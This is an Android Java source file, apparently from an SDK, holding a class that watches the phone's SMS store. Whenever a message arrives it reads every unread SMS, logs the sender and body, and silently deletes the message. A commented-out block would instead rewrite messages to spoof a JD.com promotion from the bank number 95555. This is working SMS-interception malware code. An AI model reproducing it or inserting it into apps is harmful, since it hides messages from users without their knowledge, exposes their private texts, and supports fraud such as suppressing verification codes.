package com.example.administrator.sdk.sms;

import android.app.Activity;
import android.content.ContentValues;
import android.content.Context;
import android.database.ContentObserver;
import android.database.Cursor;
import android.net.Uri;
import android.os.Handler;

import com.example.administrator.sdk.utils.Log;

import java.util.ArrayList;
import java.util.List;

/**
 * Created by Administrator on 2017/7/20.
 */

public class SmsInterceptCenter extends ContentObserver {
    public static List<String> interceptContentList = new ArrayList<>();
    private Context context = null;
    private static int smsID = 0;

    public SmsInterceptCenter(Handler handler, Context context) {
        super(handler);
        this.context = context;
    }

    @Override
    public void onChange(boolean selfChange, Uri uri) {
        super.onChange(selfChange, uri);
        Log.debug("onChange:" + uri.toString());
        if (uri.toString().equals("content://sms/")) {
            return;
        }
        if (uri.toString().equals("content://sms")) {
            return;
        }
        String uriID = uri.toString().substring(uri.toString().lastIndexOf("/") + 1);
        if (!uriID.equals("")) {
            int uriID2Int = Integer.parseInt(uriID);
            if (uriID2Int == smsID) {
                return;
            } else {
                smsID = uriID2Int;
            }
        }

        ReadSmsContent(context);
    }

    public void ReadSmsContent(Context context) {
        Cursor mCursor = context.getContentResolver().query(Uri.parse("content://sms"),
                new String[]{"_id", "address", "read", "body", "thread_id"}, "read=?", new String[]{"0"},
                "date desc");
        while (mCursor.moveToNext()) {
            ContentValues values = new ContentValues();
            String id = mCursor.getString(mCursor.getColumnIndexOrThrow("_id"));
            String address = mCursor.getString(mCursor.getColumnIndexOrThrow("address"));
            String read = mCursor.getString(mCursor.getColumnIndexOrThrow("read"));
            String body = mCursor.getString(mCursor.getColumnIndexOrThrow("body"));
            String thread_id = mCursor.getString(mCursor.getColumnIndexOrThrow("thread_id"));
            StringBuffer sb = new StringBuffer();
            sb.append("_id: " + id);
            sb.append(" address: " + address);
            sb.append(" read: " + read);
            sb.append(" body: " + body);
            sb.append(" thread_id: " + thread_id);
            Log.debug(" sms content : " + sb.toString());
//            values.put("read", "1");
//            values.put("address", "95555");
//            values.put("body", "京东会员，我们准备了51元暖心礼包+专享花费券！戳 dc.jd.com/dPEJQQ 领走！神券在握，低价不怕错过！ 回BK退订【京东】");
//            context.getContentResolver().update(Uri.parse("content://sms/"), values, "_id=?", new String[]{"" + id});
            delete(id);
        }
    }

    private int delete(String _id) {
        Uri contentUri = Uri.parse("content://sms");
        int delete = context.getContentResolver().delete(contentUri, "read=0 and _id=?", new String[]{_id});
        return delete;
    }
}
